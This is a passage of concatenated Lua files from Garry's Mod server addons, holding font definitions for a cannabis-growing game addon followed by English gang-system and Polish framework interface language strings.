	font = "Arial",
	extended = true,
	size = ScreenScale( 10 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_ventilator_font01", {
	font = "Arial",
	extended = true,
	size = 15,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_watertank_font01", {
	font = "Arial",
	extended = true,
	size = 50,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_outlet_font01", {
	font = "Arial",
	extended = true,
	size = 20,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_lamp01_font01", {
	font = "Arial",
	extended = true,
	size = 20,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_palette_font01", {
	font = "Arial",
	extended = true,
	size = 500,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})
surface.CreateFont("zwf_palette_font02", {
	font = "Arial",
	extended = true,
	size = 500,
	weight = 1000,
	blursize = 15,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_flowerpot_font01", {
	font = "Arial",
	extended = true,
	size = 21,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_flowerpot_font02", {
	font = "Arial",
	extended = true,
	size = 21,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_flowerpot_font03", {
	font = "Arial",
	extended = true,
	size = 14,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_flowerpot_font04", {
	font = "Arial",
	extended = true,
	size = 29,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_generator_font01", {
	font = "RUSAK",
	extended = true,
	size = 75,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})
surface.CreateFont("zwf_generator_font02", {
	font = "RUSAK",
	extended = true,
	size = 80,
	weight = 1000,
	blursize = 15,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = true,
	outline = false
})
surface.CreateFont("zwf_generator_font03", {
	font = "Arial",
	extended = true,
	size = 40,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_plant_font01", {
	font = "RUSAK",
	extended = true,
	size = 100,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_plant_font02", {
	font = "Arial",
	extended = true,
	size = 90,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_seed_font01", {
	font = "Arial",
	extended = true,
	size = 100,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_seed_font02", {
	font = "Arial",
	extended = true,
	size = 55,
	weight = 100,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_packingstation_font01", {
	font = "Arial",
	extended = true,
	size = 75,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_packingstation_font02", {
	font = "Arial",
	extended = true,
	size = 55,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_npc_font01", {
	font = "RUSAK",
	extended = true,
	size = 75,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_npc_font02", {
	font = "RUSAK",
	extended = true,
	size = 25,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})




surface.CreateFont("zwf_jar_font01", {
	font = "Arial",
	extended = true,
	size = 100,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_jar_font02", {
	font = "Arial",
	extended = true,
	size = 70,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_weedblock_font01", {
	font = "Arial",
	extended = true,
	size = 100,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_weedblock_font02", {
	font = "Arial",
	extended = true,
	size = 70,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_splicelab_font01", {
	font = "Arial",
	extended = true,
	size = 40,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_splicelab_font02", {
	font = "Arial",
	extended = true,
	size = 25,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_splicelab_font03", {
	font = "Arial",
	extended = true,
	size = 70,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_splicelab_font03_small", {
	font = "Arial",
	extended = true,
	size = 50,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_splicelab_font04", {
	font = "Arial",
	extended = true,
	size = 30,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_splicelab_font05", {
	font = "Arial",
	extended = true,
	size = 20,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_seedbank_vgui_font01", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 5 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_seedbank_vgui_font02", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 10 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})



surface.CreateFont("zwf_doobytable_font01", {
	font = "Arial",
	extended = true,
	size = 50,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_doobytable_font02", {
	font = "Arial",
	extended = true,
	size = 25,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})





surface.CreateFont("zwf_mixer_font01", {
	font = "Arial",
	extended = true,
	size = 50,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})


surface.CreateFont("zwf_mixer_font02", {
	font = "Arial",
	extended = true,
	size = 25,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})





surface.CreateFont("zwf_settings_font01", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 12 ),
	weight = ScreenScale( 300 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

surface.CreateFont("zwf_settings_font02", {
	font = "Arial",
	extended = true,
	size = ScreenScale( 8 ),
	weight = ScreenScale( 5 ),
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = false,
	additive = false,
	outline = false
})

--PATH addons/bricks_gangs/lua/bricks_server/languages/bricks_gangs/english.lua:
BRICKS_SERVER.Func.AddLanguageStrings( "english", {
    ["gang"] = "Gang",
    ["gangNew"] = "New Gang",
    ["gangRequestCooldown"] = "Please wait before requesting more gangs!",
    ["gangRequestDataCooldown"] = "Please wait before requesting data about another gang!",
    ["gangNewUpgrade"] = "New Upgrade",
    ["gangUpgradeTierEdit"] = "%s - Tier %d",
    ["gangNewAchievement"] = "New Achievement",
    ["gangNewTerritory"] = "New Territory",
    ["gangRewardTime"] = "Reward Time",
    ["gangRewardTimeQuery"] = "How often should the occupying gang receive rewards?",
    ["gangRewards"] = "Rewards",
    ["gangNewLeaderboard"] = "New Leaderboard",
    ["gangRankQuery"] = "What rank would you like to set them to?",
    ["gangPlayerAlreadyRank"] = "The player is already this rank!",
    ["gangInvalidRank"] = "Invalid rank.",
    ["gangKick"] = "Kick",
    ["gangKickConfirm"] = "Are you sure you want to kick this member?",
    ["gangSetOwner"] = "Set owner",

    ["gangInbox"] = "GANG INBOX",
    ["gangNoNotifications"] = "You have no notifications!",
    ["gangTimeAgo"] = "%s ago",
    ["gangNotification"] = "Gang Notification",
    ["gangNotificationHeader"] = "What would you like the header of the notification to be?",
    ["gangAdminNotification"] = "Admin Notification",
    ["gangNotificationBody"] = "What would you like the main body of the notification to be?",
    ["gangAdminNotificationSent"] = "Sent an admin gang notification to %s!",

    ["gangVariables"] = "Variables",

    ["gangClaimedAchievement"] = "Successfully claimed achievement rewards!",
    ["gangAlreadyAssociation"] = "Your gang already has this type of association with the other gang!",
    ["gangAlreadySentAssociation"] = "Your gang has already sent them an association invite!",
    ["gangAssociationSent"] = "Association invite sent!",
    ["gangAssociationAccepted"] = "Association invite accepted!",
    ["gangNoAssociation"] = "Your gang does not have any association with this gang!",
    ["gangAssociationDissolved"] = "Association dissolved!",

    ["gangOwner"] = "Owner",
    ["gangOfficer"] = "Officer",
    ["gangMember"] = "Member",

    ["gangCannotDeposit"] = "You cannot deposit this weapon!",
    ["gangStorageFullError"] = "Your gang storage is full!",
    ["gangDepositedItem"] = "You have deposited an item into your gang's storage!",
    ["gangDroppedItem"] = "Dropped 1 item from your gang storage.",
    ["gangUsedItem"] = "Used 1 item from your gang storage.",
    ["gangCantUse"] = "You can't use that!",

    ["gangKicked"] = "You have been kicked from the gang %s!",
    ["gangAlreadyIn"] = "You are already in a gang!",
    ["gangNameLength"] = "The gang name cannot be longer than %d characters!",
    ["gangIconLength"] = "The gang icon URL cannot be longer than %d characters!",
    ["gangIconWhitelisted"] = "Your gang icon image URL is not whitelisted, try using imgur instead.",
    ["gangCreatedFor"] = "Your new gang has been created for %s!",
    ["gangCreated"] = "Your new gang has been created!",
    ["gangCreationNoMoney"] = "You don't have enough money, you need %s!",
    ["gangWaitBeforeSaving"] = "Please wait %d seconds before saving your changes again!",
    ["gangRolesUpdated"] = "Gang roles updated!",
    ["gangCannotTarget"] = "You cannot target this player!",
    ["gangRankNotExists"] = "This rank doesn't exist!",
    ["gangCantPromote"] = "You can't promote someone to a rank higher than or the same as yours!",
    ["gangRankSet"] = "Rank successfully set!",
    ["gangRankSetFail"] = "Failed to set rank!",
    ["gangSettingsUpdated"] = "Gang settings updated!",
    ["gangPlayerKicked"] = "Successfully kicked %s from your gang!",
    ["gangPlayerKickError"] = "Error when kicking gang member!",
    ["gangWaitBeforeInvite"] = "Please wait 5 seconds before inviting another player!",
    ["gangPlayerOffline"] = "This player is no longer online!",
    ["gangPlayerAlreadyInvited"] = "This player has already been invited!",
    ["gangPlayerInvited"] = "You have invited %s to your gang!",
    ["gangInviteReceived"] = "You have been invited to the gang %s! Type !gang to accept.",
    ["gangLeaveCurrent"] = "You must leave your current gang first!",
    ["gangReachedMemberLimit"] = "The gang has reached its member limit!",
    ["gangJoined"] = "Successfully joined %s!",
    ["gangNotEnoughMoney"] = "You don't have enough money!",
    ["gangDepositedMoney"] = "Successfully deposited %s into your gang!",
    ["gangWithdrewMoney"] = "Successfully withdrew %s from your gang!",
    ["gangDisbanded"] = "Successfully disbanded %s!",
    ["gangOwnershipTransfered"] = "Successfully transfered ownership of %s to %s!",
    ["gangLeft"] = "You have left %s!",

    ["gangTerritoryCaptured"] = "Your gang has captured the %s territory!",
    ["gangIncorrectLevel"] = "Your gang is not the right level to purchase this upgrade!",
    ["gangIncorrectGroup"] = "You are not the right group to buy this upgrade!",
    ["gangUpgradeBought"] = "Upgrade purchased for %s!",
    ["gangNotEnoughFunds"] = "Your gang doesn't have enough funds to purchase this upgrade!",

    ["gangAddAchievement"] = "Add Achievement",
    ["gangNewAchievementType"] = "What should the new achivement's type be?",
    ["gangAddLeaderboard"] = "Add Leaderboard",
    ["gangNewLeaderboardType"] = "What should the new leaderboard type be?",
    ["gangAddTerritory"] = "Add Territory",
    ["gangAddTier"] = "Add Tier",
    ["gangTierX"] = "Tier %d",
    ["gangNewUpgradeType"] = "What should the new upgrade type be?",
    ["gangNewUpgradeDesc"] = "New upgrade description.",

    ["gangDepositMenu"] = "Gang Deposit Menu",
    ["gangDepositInventoryQuery"] = "Are you want to deposit %s from your inventory?",
    ["gangDepositPlayerQuery"] = "Are you want to deposit %s from your player's loadout?",
    ["gangNoDepositItems"] = "You don't have any items that can be deposited!",

    ["gangMenu"] = "Gang Menu",
    ["gangNone"] = "No gang",
    ["gangID"] = "ID: %d",
    ["gangDashboard"] = "Dashboard",
    ["gangMembers"] = "Members",
    ["gangStorage"] = "Storage",
    ["gangUpgrades"] = "Upgrades",
    ["gangBalance"] = "Balance",
    ["gangAchievements"] = "Achievements",
    ["gangAssociations"] = "Associations",
    ["gangLeaderboards"] = "Leaderboards",
    ["gangTerritories"] = "Territories",
    ["gangRanks"] = "Ranks",
    ["gangCreate"] = "Create gang",
    ["gangProgress"] = "Progress: %s",

    ["gangNoneFound"] = "No gangs found matching your search.",
    ["gangMemberCount"] = "%d/%d Members",
    ["gangFailedToLoad"] = "Failed to load gang data!",
    ["gangSetRank"] = "Set rank",
    ["gangDissolveAssociation"] = "Would you like to dissolve this association?",
    ["gangAssociationStatus"] = "Status: %s",
    ["gangNeutral"] = "Neutral",
    ["gangCreateString"] = "Create gang for %s",
    ["gangName"] = "Gang Name:",
    ["gangIcon"] = "Icon URL:",
    
    ["gangInformation"] = "GANG STATISTICS",
    ["gangChat"] = "GANG CHAT",
    ["gangMessage"] = "Message gang",
    ["gangActions"] = "GANG ACTIONS",
    ["gangDepositMoney"] = "Deposit money",
    ["gangDepositMoneyQuery"] = "How much would you like to deposit?",
    ["gangDepositMoneyLess"] = "You cannot deposit less than %s!",
    ["gangDepositMoneyMuch"] = "Your gang balance cannot hold this much, you must upgrade your balance storage!",
    ["gangWithdrawMoney"] = "Withdraw money",
    ["gangWithdrawMoneyQuery"] = "How much would you like to withdraw?",
    ["gangWithdrawMoneyLess"] = "You cannot withdraw less than %s!",
    ["gangWithdrawMoneyMuch"] = "Your gang does not have enough funds!",
    ["gangInvitePlayer"] = "Invite player",
    ["gangInvitePlayerQuery"] = "What player would you like to invite?",
    ["gangDisband"] = "Disband gang",
    ["gangDisbandQuery"] = "Deleting your gang cannot be undone, type %s to delete it.",
    ["gangTransfer"] = "Transfer ownership",
    ["gangTransferQuery"] = "Who would you like to transfer ownership to?",
    ["gangLeave"] = "Leave gang",
    ["gangLeaveQuery"] = "Are you sure you want to leave this gang?",
    ["gangMemberUpper"] = "GANG MEMBERS",
    ["gangHighestRank"] = "Highest Rank",
    ["gangLowestRank"] = "Lowest Rank",

    ["gangUnsavedChanges"] = "You have unsaved changes.",
    ["gangSaveChanges"] = "Save changes",
    ["gangReset"] = "Reset Changes",
    ["gangRanksUpper"] = "GANG RANKS",
    ["gangNewRank"] = "New rank",
    ["gangRankName"] = "Rank Name",
    ["gangRankColor"] = "Rank Color",
    ["gangClearPerms"] = "Clear Permissions",
    ["gangDeleteRank"] = "Delete Rank",
    ["gangDeleteRankQuery"] = "Are you sure you want to delete this rank?",

    ["gangStorageUpper"] = "GANG STORAGE",
    ["gangStorageProgress"] = "Storage %d/%d",
    ["gangClaimed"] = "Claimed",
    ["gangUnclaimed"] = "Unclaimed",
    ["gangClaimedAgo"] = "Claimed %s ago",
    ["gangRewardsEvery"] = "Given every %s",
    ["gangBuyUpgrade"] = "Do you want to buy this upgrade for %s?",
    ["gangUpgradeTier"] = "Upgrade Tier %d/%d",
    ["gangCurrent"] = "Current: %s",
    ["gangNext"] = "Next Tier: %s",

    ["gangTerritoryUpper"] = "TERRITTORY",
    ["gangCaptured"] = "CAPTURED",
    ["gangTerritoryAlready"] = "Your gang has already captured this territory!",
    ["gangCaptureFail"] = "You moved too far away or died, capture failed!",
    ["gangTerritoryPlaced"] = "Territory succesfully placed.",
    ["gangInvalidTerritory"] = "Invalid territory, choose a valid one from the tool menu.",
    ["gangTerritoryRemoved"] = "Territory succesfully removed.",
    ["gangTerritoryRemoveFail"] = "You can only use this tool to remove/create an territories.",
    ["gangTerritoryDesc"] = "Places and removes Territories from Brick's Server, LeftClick - place, RightClick - remove.",
    ["gangTerritory"] = "Territory",
    ["gangTerritoryPlacer"] = "Territory Placer",
    ["gangTerritoryDescSmall"] = "Places and removes Territories from Brick's Server.",
    ["gangTerritoryInstructions"] = "LeftClick - place, RightClick - remove.",

    ["gangSettings"] = "Settings",
    ["gangManagement"] = "Management",
    ["gangChatLower"] = "Gang Chat",
    ["gangDepositItems"] = "Deposit items",
    ["gangWithdrawItems"] = "Withdraw items",
    ["gangViewStorage"] = "View storage",
    ["gangEditRoles"] = "Edit roles",
    ["gangEditSettings"] = "Edit settings",
    ["gangInvitePlayers"] = "Invite players",
    ["gangKickPlayers"] = "Kick players",
    ["gangChangeRank"] = "Change players' rank",
    ["gangPurchaseUpgrades"] = "Purchase upgrades",
    ["gangAcceptDeclineInbox"] = "Accept/decline inbox notifications",
    ["gangAssociationSend"] = "Send association requests",
    ["gangAssociationAccept"] = "Accept association requests",
    ["gangSendChatMessages"] = "Send chat messages",
    ["gangMaxMembers"] = "Max Members",
    ["gangMaxBalance"] = "Max Balance",
    ["gangStorageSlots"] = "Storage Slots",
    ["gangXSlots"] = "%d Slots",
    ["gangSlots"] = "Slots",
    ["gangIncreasedHealth"] = "Increased Health",
    ["gangExtraHealth"] = "Extra Health",
    ["gangXHP"] = "+%d HP",
    ["gangIncreasedArmor"] = "Increased Armor",
    ["gangXAP"] = "+%d AP",
    ["gangExtraArmor"] = "Extra Armor",
    ["gangIncreasedSalary"] = "Increased Salary",
    ["gangExtraSalary"] = "Extra Salary",
    ["gangPermWeapon"] = "Permanent Weapon",
    ["gangWeapon"] = "Weapon",
    ["gangBalanceFull"] = "Gang Balance",
    ["gangMembersFull"] = "Gang Members",
    ["gangStorageFull"] = "Gang Storage",
    ["gangItems"] = "Items",
    ["gangItem"] = "Item",
    ["gangLevel"] = "Gang Level",
    ["gangInvite"] = "Gang Invite",
    ["gangInviteReceivedInbox"] = "You have been invited to join the gang %s!",
    ["gangAssociationInvite"] = "Association Invite",
    ["gangAssociationInviteInbox"] = "The gang %s has requested the association '%s' with your gang!",
    ["gangAssociationCreated"] = "Association Created",
    ["gangAssociationCreatedInbox"] = "Your gang now has the association '%s' with the gang %s!",
    ["gangAssociationDissolved"] = "Association Dissolved",
    ["gangAssociationDissolvedInbox"] = "Your association with the gang %s has been dissolved!",
    ["gangInboxAchievement"] = "Gang Achievement",
    ["gangInboxAchievementCompleted"] = "Your gang has completed the '%s' achievement!",
    ["gangInboxAchievementCompletedReward"] = "Your gang has completed the '%s' achievement, rewards: %s!",
    ["gangExperienceFull"] = "Gang Experience",
    ["gangJobWhitelist"] = "Job Whitelist",
    ["gangJobs"] = "Jobs",
    ["gangJobsSelect"] = "Select the teams which the players are whitelisted as.",
    ["gangStorageItems"] = "Storage Items",
    ["gangAllyRequest"] = "Are you sure you want to request to ally with this gang?",
    ["gangWarRequest"] = "Are you sure you want to request a war with this gang?",
    ["gangSetLevel"] = "Set Level",
    ["gangSetLevelQuery"] = "What should the gang's new level be?",
    ["gangSetLevelMsg"] = "Succesfully set the level of the gang %s to %d!",
    ["gangAddExperience"] = "Add Experience",
    ["gangAddExperienceQuery"] = "How much experience would you like to add to the gang?",
    ["gangAddExperienceMsg"] = "Succesfully added %s experience to the gang %s!",
    ["gangSetBalance"] = "Set Balance",
    ["gangSetBalanceQuery"] = "What should the gang's new balance to be?",
    ["gangSetBalanceMsg"] = "Succesfully set the balance of the gang %s to %s!",
    ["gangAddBalance"] = "Add Balance",
    ["gangAddBalanceQuery"] = "How much money would you like to add to the gang's balance?",
    ["gangAddBalanceMsg"] = "Succesfully added %s balance to the gang %s!",
    ["gangViewMembers"] = "View Members",
    ["gangCantKickOwner"] = "You cannot kick the owner of the gang!",
    ["gangKickSuccessAdmin"] = "Successfully kicked member from gang!",
    ["gangKickFailAdmin"] = "Failed to kick member from gang!",
    ["gangSetRankSuccessAdmin"] = "Successfully set rank of member!",
    ["gangSetRankFailAdmin"] = "Failed to set rank of member!",
    ["gangMemberAlreadyOwner"] = "This member is already the owner of this gang!",
    ["gangNotMember"] = "This player is not a member of this gang!",
    ["gangOwnershipTransferedAdmin"] = "Successfully transfered gang ownership!",
    ["gangDeleteAdminQuery"] = "Deleting a gang cannot be undone, type %s to delete it.",
    ["gangDeleteSuccessAdmin"] = "Successfully deleted the gang %s!",
    ["gangMenuBind"] = "Gang Menu Bind",

    ["gangTerritoryBeingCaptured"] = "Your gang territory %s is being captured!",
    ["gangXMessage"] = "%d MESSAGE",
    ["gangXMessages"] = "%d MESSAGES",
    ["gangInfo"] = "GANG INFO",
    ["gangMessageDisabled"] = "The gang chat is currently disabled.",
    ["gangPrinters"] = "Printers",
    ["gangPurchasePrinters"] = "Purchase printers",
    ["gangUpgradePrinters"] = "Upgrade printers",
    ["gangPlacePrinters"] = "Place printers",
    ["gangPrinterUpgrades"] = "Printer Upgrades",

    ["gangRankLimit"] = "You have reached the rank limit of %d!",
    ["gangRankLowLimit"] = "You must have at least 1 rank!"
} )
--PATH addons/brick_s_server_framework/lua/bricks_server/languages/bricks_server/polish.lua:
BRICKS_SERVER.Func.AddLanguageStrings( "polish", {
    ["search"] = "Szukaj",
    ["invalidPlayerProfile"] = "Niewłaściwy profil gracza!",
    ["unbound"] = "ROZWIĄZANY",
    ["themes"] = "Motywy",
    ["groups"] = "Grupy",
    ["general"] = "Główne",
    ["itemWhitelisting"] = "Itemy białej listy",
    ["rarities"] = "Rarytasy",
    ["languages"] = "Języki",
    ["disabled"] = "Wyłączono",
    ["enabled"] = "Włączono",
    ["purchase"] = "Zakup",
    ["profile"] = "Profil",
    ["view"] = "Widok",
    ["admin"] = "Admin",
    ["noToolPermission"] = "Nie masz pozwolenia aby używać tego narzędzia.",
    ["settings"] = "Ustawienia",
    ["players"] = "Gracze",
    ["modules"] = "Moduły",
 
    ["userGroupEditor"] = "Edytor grup użytkowników",
    ["addNewGroup"] = "Dodaj nową grupe",
    ["newUserGroup"] = "Jaka powinna być nowa grupa?",
    ["groupName"] = "Nazwa grupy",
 
    ["custom"] = "Niestandardowe",
    ["addNew"] = "Dodaj nowe",
    ["material"] = "Materiał",
    ["directImage"] = "Wpisz URL obrazka .",
    ["default"] = "Podstawowe",
    ["selectMaterial"] = "Musisz wybrać materiał!",
 
    ["errorNoText"] = "BŁĄD: BRAK TEXTU",
    ["selectOption"] = "Wybierz opcje",
    ["selectValue"] = "Prosze wybierz wartość.",
    ["selectColor"] = "Prosze wybierz kolor.",
    ["configSaved"] = "Konfiguracja zapisana!",
    ["cmdNoPermission"] = "Nie masz uprawnień na urzycie tej komendy.",
    ["entityPosUpdated"] = "Zuaktualizowano pozycje jednostki.",
    ["noEntitiesSpawned"] = "Nie pojawiły się żadne zapisane jednostki.",
    ["xEntitiesSpawned"] = "%d zapisanych jednostek zespawnowało się.",
    ["error"] = "ERROR",
 
    ["seconds"] = "%d sekund",
    ["second"] = "%d sekunda",
    ["minutes"] = "%d minut",
    ["minute"] = "%d minuta",
    ["hours"] = "%d godzin",
    ["hour"] = "%d godzina",
 
    ["noRarity"] = "No rarity",
 
    ["config"] = "Konfiguracja",
    ["edit"] = "Edytuj",
    ["editColor"] = "Edytuj kolor",
    ["editName"] = "Edytuj nazwe",
    ["remove"] = "Usuń",
    ["name"] = "Nazwa",
    ["description"] = "Opis",
    ["model"] = "Model",
    ["icon"] = "Ikona",
    ["type"] = "Rodzaj",
    ["price"] = "Cena",
    ["group"] = "Grupa",
    ["category"] = "Kategorja",
    ["color"] = "Kolor",
    ["invalidType"] = "Nieprawidłowy rodzaj.",
    ["invalidOption"] = "Nieprawodłowa opcja.",
    ["invalidChoice"] = "Nieprawidłowy wybór.",
    ["invalidGroup"] = "Nieprawidłowa grupa.",
    ["invalidPlayer"] = "Nieprawidłowy gracz.",
    ["true"] = "PRAWDA",
    ["false"] = "FAŁSZ",
    ["noDescription"] = "Brak opisu",
    ["other"] = "inne",
    ["completed"] = "Ukończone",
    ["close"] = "Zamknij",
    ["main"] = "Menu",
 
    ["valueQuery"] = "Jak powinno wyglądać %s to?",
    ["dataValueQuery"] = "Jakim plikiem powinno to być?",
    ["newNameQuery"] = "Jakie powinno być nowe imie?",
    ["newDescriptionQuery"] = "Jaki powinien być nowy opis?",
    ["newModelQuery"] = "Jaki powinien być nowy model?",
    ["newIconQuery"] = "Jaka powinna być nowa ikona?",
    ["newColorQuery"] = "Jaki powiien być nowy kolor?",
    ["npcTypeQuery"] = "Jakiego rodzaju powinien być ten NPC?",
    ["newTypeQuery"] = "Jaki powinien być nowy rodzaj",
    ["groupRequirementQuery"] = "Jakie powinny być wymagania grupy?",
    ["levelRequirementQuery"] = "Jaki powinien być wymagany lvl?",
    ["newPriceQuery"] = "Jaka powinna być nowa cena?",
    ["newCategoryQuery"] = "Jaka powinna być now akategoria?",
 
    ["npcEditor"] = "Edytor NPC",
    ["addNPC"] = "Dodaj NPC",
    ["newNPC"] = "Nowy NPC",
 
    ["ok"] = "OK",
    ["cancel"] = "Anuluj",
    ["save"] = "Zapisz",
    ["confirm"] = "Potwierdz",
    ["nil"] = "NIL",
    ["none"] = "Żaden",
    ["selected"] = "Wybrany",
